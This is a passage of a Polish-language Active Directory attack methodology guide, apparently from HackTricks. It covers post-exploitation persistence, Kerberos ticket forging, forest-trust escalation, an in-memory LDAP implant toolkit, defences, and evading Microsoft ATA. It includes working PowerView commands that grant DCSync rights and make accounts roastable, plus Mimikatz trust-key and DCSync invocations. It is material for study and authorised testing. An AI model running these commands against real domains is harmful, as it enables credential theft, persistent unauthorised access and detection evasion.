Jeśli skonfigurowane są **podatne szablony**, można je nadużyć do eskalacji uprawnień:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Po uzyskaniu uprawnień **Domain Admin** lub jeszcze lepiej **Enterprise Admin**, możesz **zrzucić** **bazę domeny**: _ntds.dit_.

[**Więcej informacji o ataku DCSync znajdziesz tutaj**](dcsync.md).

[**Więcej informacji o tym, jak wykraść NTDS.dit można znaleźć tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Niektóre z wcześniej omawianych technik mogą być użyte do utrzymania **persistence**.\
Na przykład możesz:

- Uczynić użytkowników podatnymi na [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Uczynić użytkowników podatnymi na [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Nadać uprawnienia [**DCSync**](#dcsync) użytkownikowi

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Atak **Silver Ticket** tworzy prawidłowy Ticket Granting Service (TGS) dla konkretnej usługi, używając **NTLM hash** (na przykład **hasha konta komputera**). Ta metoda służy do uzyskania **uprawnień dostępu do usługi**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Atak **Golden Ticket** polega na zdobyciu przez atakującego **NTLM hash** konta **krbtgt** w środowisku Active Directory (AD). To konto jest specjalne, ponieważ służy do podpisywania wszystkich **Ticket Granting Tickets (TGTs)**, które są niezbędne do uwierzytelniania w sieci AD.

Gdy atakujący uzyska ten hash, może tworzyć **TGTy** dla dowolnego konta, które wybierze (atak Silver ticket).


{{#ref}}
golden-ticket.md
{{#endref}

### Diamond Ticket

Są to bilety podobne do golden tickets, sfałszowane w sposób, który **omija powszechne mechanizmy wykrywania golden tickets**.


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Posiadanie certyfikatów konta lub możliwość ich żądania** to bardzo dobry sposób na utrzymanie persistence w koncie użytkownika (nawet jeśli zmieni hasło):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Używanie certyfikatów pozwala również na utrzymanie persistence z wysokimi uprawnieniami wewnątrz domeny:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Obiekt **AdminSDHolder** w Active Directory zapewnia bezpieczeństwo **uprzywilejowanych grup** (jak Domain Admins i Enterprise Admins) poprzez zastosowanie standardowego **Access Control List (ACL)** do tych grup, aby zapobiec nieautoryzowanym zmianom. Jednak ta funkcja może zostać wykorzystana; jeśli atakujący zmodyfikuje ACL AdminSDHolder, nadając zwykłemu użytkownikowi pełny dostęp, ten użytkownik zyska szeroką kontrolę nad wszystkimi uprzywilejowanymi grupami. Ten mechanizm zabezpieczający, mający chronić, może więc paradoksalnie umożliwić niepożądany dostęp, jeśli nie jest skrupulatnie monitorowany.

[**Więcej informacji o AdminDSHolder Group tutaj.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

W każdym **Domain Controller (DC)** istnieje konto lokalnego administratora. Zdobywając prawa administratora na takiej maszynie, można wydobyć hash lokalnego Administratora używając **mimikatz**. Następnie konieczna jest modyfikacja rejestru, aby **umożliwić użycie tego hasła**, co pozwala na zdalny dostęp do konta lokalnego Administratora.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Możesz **przyznać** pewne **specjalne uprawnienia** użytkownikowi do określonych obiektów domeny, które pozwolą temu użytkownikowi **eskalować uprawnienia w przyszłości**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** są używane do **przechowywania** **uprawnień**, które **obiekt** ma **nad** innym **obiektem**. Jeśli wprowadzisz nawet drobną **zmianę** w **security descriptorze** obiektu, możesz uzyskać bardzo interesujące uprawnienia do tego obiektu bez bycia członkiem uprzywilejowanej grupy.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Wykorzystaj pomocniczą klasę `dynamicObject`, aby tworzyć krótkotrwałe principal/e/GPO/rekordy DNS z `entryTTL`/`msDS-Entry-Time-To-Die`; usuwają się same bez tombstonów, wymazując dowody w LDAP jednocześnie pozostawiając osierocone SIDy, uszkodzone referencje `gPLink` lub zbuforowane odpowiedzi DNS (np. AdminSDHolder ACE pollution lub złośliwe `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Zmień **LSASS** w pamięci, aby ustawić **uniwersalne hasło**, dające dostęp do wszystkich kont domenowych.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Dowiedz się, czym jest SSP (Security Support Provider) tutaj.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Możesz stworzyć własny **SSP**, aby **przechwycić** poświadczenia używane do dostępu do maszyny w **postaci jawnej**.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Rejestruje **nowy Domain Controller** w AD i używa go do **wypychania atrybutów** (SIDHistory, SPNs...) na określone obiekty **bez** pozostawiania jakichkolwiek **logów** dotyczących **modyfikacji**. Potrzebujesz uprawnień DA i musisz być wewnątrz **root domain**.\
Zauważ, że jeśli użyjesz błędnych danych, pojawią się dość brzydkie logi.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Wcześniej omawialiśmy, jak eskalować uprawnienia, jeśli masz wystarczające uprawnienia do odczytu haseł LAPS. Jednak te hasła mogą być także użyte do **utrzymania persistence**.\
Sprawdź:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft traktuje **Forest** jako granicę bezpieczeństwa. To oznacza, że **kompromitacja jednej domeny może potencjalnie doprowadzić do kompromitacji całego Forest**.

### Basic Information

A [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) is a security mechanism that enables a user from one **domain** to access resources in another **domain**. It essentially creates a linkage between the authentication systems of the two domains, allowing authentication verifications to flow seamlessly. When domains set up a trust, they exchange and retain specific **keys** within their **Domain Controllers (DCs)**, which are crucial to the trust's integrity.

W typowym scenariuszu, jeśli użytkownik chce uzyskać dostęp do usługi w **trusted domain**, musi najpierw poprosić o specjalny bilet znany jako **inter-realm TGT** od swojego DC. Ten TGT jest szyfrowany przy użyciu współdzielonego **klucza**, który obie domeny uzgodniły. Użytkownik przedstawia następnie ten inter-realm TGT **DC trusted domain**, aby otrzymać bilet serwisowy (**TGS**). Po pomyślnej weryfikacji inter-realm TGT przez DC domeny zaufanej, wydaje ona TGS, przyznając użytkownikowi dostęp do usługi.

**Kroki**:

1. Komputer kliencki w **Domain 1** rozpoczyna proces, używając swojego **NTLM hash**, by poprosić o **Ticket Granting Ticket (TGT)** od swojego **Domain Controller (DC1)**.
2. DC1 wydaje nowy TGT, jeśli klient zostanie pomyślnie uwierzytelniony.
3. Klient następnie prosi DC1 o **inter-realm TGT**, który jest potrzebny do dostępu do zasobów w **Domain 2**.
4. Inter-realm TGT jest szyfrowany przy użyciu **trust key** współdzielonego między DC1 i DC2 jako część dwukierunkowego domain trust.
5. Klient zabiera inter-realm TGT do **Domain 2's Domain Controller (DC2)**.
6. DC2 weryfikuje inter-realm TGT używając współdzielonego trust key i, jeśli jest prawidłowy, wydaje **Ticket Granting Service (TGS)** dla serwera w Domain 2, do którego klient chce uzyskać dostęp.
7. Wreszcie klient przedstawia ten TGS serwerowi, który jest szyfrowany hashem konta serwera, aby uzyskać dostęp do usługi w Domain 2.

### Different trusts

Ważne jest, aby zauważyć, że **trust** może być jednokierunkowy lub dwukierunkowy. W opcji dwukierunkowej obie domeny ufają sobie nawzajem, ale w relacji **one way** jedna z domen będzie **trusted**, a druga **trusting**. W tym ostatnim przypadku **będziesz mógł uzyskać dostęp tylko do zasobów w trusting domain z trusted domain**.

Jeśli Domain A ufa Domain B, A jest domainem trusting, a B jest trusted. Co więcej, w **Domain A** będzie to **Outbound trust**; a w **Domain B** będzie to **Inbound trust**.

**Różne relacje zaufania**

- **Parent-Child Trusts**: Typowa konfiguracja w obrębie tego samego forest, gdzie domena potomna automatycznie ma dwukierunkowy zaufany transytywny trust z domeną rodzica. Oznacza to, że żądania uwierzytelniania mogą przepływać bez problemu między rodzicem a potomkiem.
- **Cross-link Trusts**: Nazywane też "shortcut trusts", zakładane między domenami potomnymi, aby przyspieszyć procesy referencji. W złożonych forestach odniesienia uwierzytelniające zwykle muszą przejść do root forest, a następnie do docelowej domeny. Tworząc cross-links skracasz tę ścieżkę, co jest przydatne w środowiskach rozproszonych geograficznie.
- **External Trusts**: Zakładane między różnymi, niespowinowaconymi domenami i z natury nie są transytywne. Według [dokumentacji Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts są użyteczne do dostępu do zasobów w domenie poza bieżącym forest, która nie jest połączona poprzez forest trust. Bezpieczeństwo jest wzmacniane przez filtrowanie SID przy external trusts.
- **Tree-root Trusts**: Te trusty są automatycznie ustanawiane między root domeną forest a nowo dodanym tree root. Choć rzadziej spotykane, tree-root trusts są istotne przy dodawaniu nowych drzew domen do forest, umożliwiając im zachowanie unikalnej nazwy domeny i zapewniając dwukierunkową transytywność. Więcej informacji w [poradniku Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Ten typ trustu to dwukierunkowy transytywny trust między dwoma root domenami forest, również wymuszający filtrowanie SID w celu zwiększenia bezpieczeństwa.
- **MIT Trusts**: Zakładane z nie-Windowsowymi, zgodnymi z [RFC4120](https://tools.ietf.org/html/rfc4120) domenami Kerberos. MIT trusts są bardziej wyspecjalizowane i służą integracji z systemami Kerberos poza ekosystemem Windows.

#### Other differences in **trusting relationships**

- Relacja zaufania może być również **transitive** (A trusts B, B trusts C, wtedy A trusts C) lub **non-transitive**.
- Relacja zaufania może być ustawiona jako **bidirectional trust** (obie ufają sobie nawzajem) lub jako **one-way trust** (tylko jedna ufa drugiej).

### Attack Path

1. **Enumerate** relacje zaufania
2. Sprawdź, czy jakiś **security principal** (user/group/computer) ma **access** do zasobów **drugiej domeny**, być może przez wpisy ACE lub przez członkostwo w grupach drugiej domeny. Szukaj **relacji między domenami** (prawdopodobnie trust został utworzony właśnie do tego celu).
1. kerberoast w tym przypadku może być kolejną opcją.
3. **Skompromituj** **kont(a)**, które mogą **pivot**ować przez domeny.

Atakujący mogą mieć dostęp do zasobów w innej domenie poprzez trzy główne mechanizmy:

- **Local Group Membership**: Principale mogą być dodani do lokalnych grup na maszynach, takich jak grupa „Administrators” na serwerze, co daje im znaczną kontrolę nad tą maszyną.
- **Foreign Domain Group Membership**: Principale mogą też być członkami grup w obcej domenie. Jednak skuteczność tej metody zależy od natury trustu i zakresu grupy.
- **Access Control Lists (ACLs)**: Principale mogą być wyspecyfikowani w **ACL**, szczególnie jako encje w **ACE** w **DACL**, dając im dostęp do konkretnych zasobów. Dla zainteresowanych mechaniką ACL, DACL i ACE, whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” jest cennym źródłem.

### Find external users/groups with permissions

Możesz sprawdzić `CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`, aby znaleźć foreign security principals w domenie. Będą to użytkownicy/grupy z **zewnętrznej domeny/forest**.

Możesz to sprawdzić w **Bloodhound** lub przy użyciu **powerview**:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Inne sposoby enumeracji zaufania domen:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Istnieją **2 zaufane klucze**, jeden dla _Child --> Parent_ i drugi dla _Parent_ --> _Child_.\
> Możesz sprawdzić, który jest używany przez bieżącą domenę za pomocą:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Zyskanie uprawnień Enterprise admin w domenie child/parent przez nadużycie zaufania za pomocą SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Wykorzystanie zapisywalnego Configuration NC

Zrozumienie, jak można wykorzystać Configuration Naming Context (NC), jest kluczowe. Configuration NC pełni rolę centralnego repozytorium danych konfiguracyjnych w całym lesie w środowiskach Active Directory (AD). Dane te są replikowane do każdego Domain Controller (DC) w lesie, a zapisywalne DC utrzymują zapisywalną kopię Configuration NC. Aby to wykorzystać, trzeba mieć **uprawnienia SYSTEM na DC**, najlepiej na child DC.

**Link GPO to root DC site**

Kontener Sites w Configuration NC zawiera informacje o site'ach wszystkich komputerów dołączonych do domeny w lesie AD. Działając z uprawnieniami SYSTEM na dowolnym DC, atakujący mogą podlinkować GPO do site'ów root DC. Ta operacja może potencjalnie skompromitować domenę root poprzez manipulację politykami stosowanymi do tych site'ów.

For in-depth information, one might explore research on [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Wejście ataku polega na celowaniu w uprzywilejowane gMSA w domenie. KDS Root key, niezbędny do obliczania haseł gMSA, jest przechowywany w Configuration NC. Mając uprawnienia SYSTEM na dowolnym DC, można uzyskać dostęp do KDS Root key i obliczyć hasła dla dowolnego gMSA w całym lesie.

Szczegółowa analiza i instrukcja krok po kroku dostępne są w:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Komplementarny atak na delegowaną MSA (BadSuccessor – nadużywanie atrybutów migracji):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Dodatkowe badania zewnętrzne: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Ta metoda wymaga cierpliwości, oczekiwania na utworzenie nowych uprzywilejowanych obiektów AD. Mając uprawnienia SYSTEM, atakujący może zmodyfikować AD Schema, aby przyznać dowolnemu użytkownikowi pełną kontrolę nad wszystkimi klasami. Może to prowadzić do nieautoryzowanego dostępu i kontroli nad nowo utworzonymi obiektami AD.

Dalsze czytanie dostępne jest w [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Luka ADCS ESC5 pozwala na przejęcie kontroli nad obiektami Public Key Infrastructure (PKI) w celu utworzenia szablonu certyfikatu, który umożliwia uwierzytelnianie jako dowolny użytkownik w lesie. Ponieważ obiekty PKI znajdują się w Configuration NC, kompromitacja zapisywalnego child DC umożliwia przeprowadzenie ataków ESC5.

Więcej szczegółów można znaleźć w [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). W scenariuszach bez ADCS, atakujący ma możliwość skonfigurowania niezbędnych komponentów, jak omówiono w [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### Domena zewnętrznego lasu - jednokierunkowa (Inbound) lub dwukierunkowa
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
W tym scenariuszu **twoja domena jest zaufana** przez domenę zewnętrzną, co daje twojej domenie **nieokreślone uprawnienia** wobec niej. Musisz ustalić, **które konta twojej domeny mają jaki dostęp do domeny zewnętrznej**, a następnie spróbować to wykorzystać:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Zewnętrzna domena lasu — jednokierunkowa (wychodząca)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
W tym scenariuszu **Twoja domena** **przyznaje zaufanie** pewnym **uprawnieniom** podmiotu z **innej domeny**.

Jednakże, kiedy **domena jest zaufana** przez domenę ufającą, domena zaufana **tworzy użytkownika** o **przewidywalnej nazwie**, który jako **hasło** używa **zaufanego hasła**. Co oznacza, że możliwe jest **uzyskanie dostępu do użytkownika z domeny ufającej, aby dostać się do domeny zaufanej** w celu jej enumeracji i próby eskalacji uprawnień:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Innym sposobem przejęcia domeny zaufanej jest znalezienie [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) utworzonego w **przeciwnym kierunku** względem zaufania domeny (co nie jest zbyt powszechne).

Innym sposobem przejęcia domeny zaufanej jest oczekiwanie na maszynie, do której **użytkownik z domeny zaufanej może się zalogować** za pomocą **RDP**. Następnie atakujący mógłby wstrzyknąć kod do procesu sesji RDP i stamtąd **uzyskać dostęp do pierwotnej domeny ofiary**.  
Co więcej, jeśli **ofiara zamontowała swój dysk twardy**, z procesu **sesji RDP** atakujący mógłby umieścić **backdoors** w **folderze autostartu dysku twardego**. Ta technika nazywa się **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Łagodzenie nadużyć zaufania domen

### **SID Filtering:**

- Ryzyko ataków wykorzystujących atrybut SIDHistory w ramach zaufania między lasami jest ograniczane przez SID Filtering, które jest domyślnie włączone dla wszystkich zaufania międzylasowych. Opiera się to na założeniu, że zaufania wewnątrz lasu są bezpieczne, przyjmując las jako granicę bezpieczeństwa, a nie domenę, zgodnie z stanowiskiem Microsoftu.
- Jednak jest haczyk: SID Filtering może zakłócać działanie aplikacji i dostęp użytkowników, co prowadzi do jego czasowego wyłączania.

### **Selective Authentication:**

- W przypadku zaufania między lasami zastosowanie Selective Authentication powoduje, że użytkownicy z obu lasów nie są automatycznie uwierzytelniani. Zamiast tego wymagane są jawne uprawnienia, aby użytkownicy mogli uzyskać dostęp do domen i serwerów w obrębie domeny/lasu ufającego.
- Należy jednak zauważyć, że te środki nie chronią przed wykorzystaniem zapisywalnego Configuration Naming Context (NC) ani przed atakami na konto zaufania.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) implementuje na nowo LDAP-owe prymitywy w stylu bloodyAD jako x64 Beacon Object Files, które działają w całości wewnątrz implantu na hoście (np. Adaptix C2). Operatorzy kompilują pakiet poleceniem `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, ładują `ldap.axs`, a następnie wywołują `ldap <subcommand>` z beacona. Cały ruch odbywa się w kontekście bezpieczeństwa bieżącego logowania przez LDAP (389) z podpisywaniem/szyfrowaniem lub LDAPS (636) z automatycznym zaufaniem certyfikatu, więc nie są wymagane socks proxies ani artefakty na dysku.

### Enumeracja LDAP po stronie implantu

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` oraz `get-groupmembers` rozwiązują krótkie nazwy/ścieżki OU do pełnych DN i zrzucają odpowiadające obiekty.
- `get-object`, `get-attribute` oraz `get-domaininfo` pobierają dowolne atrybuty (w tym security descriptors) oraz metadane lasu/domeny z `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` oraz `get-rbcd` ujawniają kandydatów do roasting, ustawienia delegacji oraz istniejące deskryptory [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) bezpośrednio z LDAP.
- `get-acl` oraz `get-writable --detailed` parsują DACL, wypisując podmioty (trustees), uprawnienia (GenericAll/WriteDACL/WriteOwner/zapisy atrybutów) oraz dziedziczenie, dając bezpośrednie cele do eskalacji uprawnień przez ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP — operacje zapisu umożliwiające eskalację i utrzymanie dostępu

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) pozwalają operatorowi umieścić nowych principali lub konta maszynowe wszędzie tam, gdzie istnieją prawa do OU. `add-groupmember`, `set-password`, `add-attribute`, oraz `set-attribute` bezpośrednio przejmują cele po uzyskaniu praw write-property.
- Polecenia koncentrujące się na ACL, takie jak `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, oraz `add-dcsync`, tłumaczą WriteDACL/WriteOwner na dowolnym obiekcie AD na reset haseł, kontrolę członkostwa w grupach lub uprawnienia replikacji DCSync, bez pozostawiania artefaktów PowerShell/ADSI. Odpowiedniki `remove-*` sprzątają wstrzyknięte ACE.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` natychmiast czynią skompromitowanego użytkownika Kerberoastable; `add-asreproastable` (przełącznik UAC) oznacza go do AS-REP roasting bez dotykania hasła.
- Makra delegacji (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) nadpisują `msDS-AllowedToDelegateTo`, flagi UAC lub `msDS-AllowedToActOnBehalfOfOtherIdentity` z beacona, umożliwiając ścieżki ataku constrained/unconstrained/RBCD i eliminując potrzebę zdalnego PowerShell lub RSAT.

### sidHistory injection, relokacja OU i kształtowanie powierzchni ataku

- `add-sidhistory` wstrzykuje uprzywilejowane SIDy do SID history kontrolowanego principala (see [SID-History Injection](sid-history-injection.md)), zapewniając ukrytą dziedziczność dostępu w pełni przez LDAP/LDAPS.
- `move-object` zmienia DN/OU komputerów lub użytkowników, pozwalając atakującemu przenieść zasoby do OU, w których prawa delegowane już istnieją, przed nadużyciem `set-password`, `add-groupmember` lub `add-spn`.
- Polecenia usuwające o wąskim zakresie (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, itd.) pozwalają na szybkie cofnięcie zmian po tym, jak operator pozyska poświadczenia lub utrwalenie dostępu, minimalizując telemetrię.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Ogólne środki obronne

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Środki obronne ochrony poświadczeń**

- **Domain Admins Restrictions**: Zaleca się, aby Domain Admins mogli logować się wyłącznie do Domain Controllers i unikać używania tych kont na innych hostach.
- **Service Account Privileges**: Usługi nie powinny być uruchamiane z uprawnieniami Domain Admin (DA).
- **Temporal Privilege Limitation**: Dla zadań wymagających uprawnień DA, należy ograniczać ich czas trwania. Można to osiągnąć za pomocą: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Audytuj Event IDs 2889/3074/3075, a następnie wymuś LDAP signing oraz LDAPS channel binding na DCs/klientach, aby zablokować próby LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementing Deception Techniques**

- Implementing deception involves setting traps, like decoy users or computers, with features such as passwords that do not expire or are marked as Trusted for Delegation. Szczegółowe podejście obejmuje tworzenie użytkowników z określonymi prawami lub dodawanie ich do grup o wysokich uprawnieniach.
- Praktyczny przykład wykorzystuje narzędzia takie jak: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- More on deploying deception techniques can be found at [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Podejrzane wskaźniki to nietypowy ObjectSID, rzadkie logowania, daty tworzenia oraz niska liczba nieudanych prób logowania.
- **General Indicators**: Porównanie atrybutów potencjalnych obiektów-wabików z atrybutami prawdziwych obiektów może ujawnić niespójności. Narzędzia takie jak [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) mogą pomagać w identyfikacji takich pułapek.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Unikanie enumeracji sesji na Domain Controllers, aby zapobiec wykryciu przez ATA.
- **Ticket Impersonation**: Wykorzystanie kluczy **aes** do tworzenia ticketów pomaga unikać wykrycia, przez co nie dochodzi do degradacji do NTLM.
- **DCSync Attacks**: Zaleca się wykonywanie z maszyny nie będącej Domain Controllerem, aby unikać wykrycia przez ATA — bezpośrednie wykonanie na Domain Controllerze wywoła alerty.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
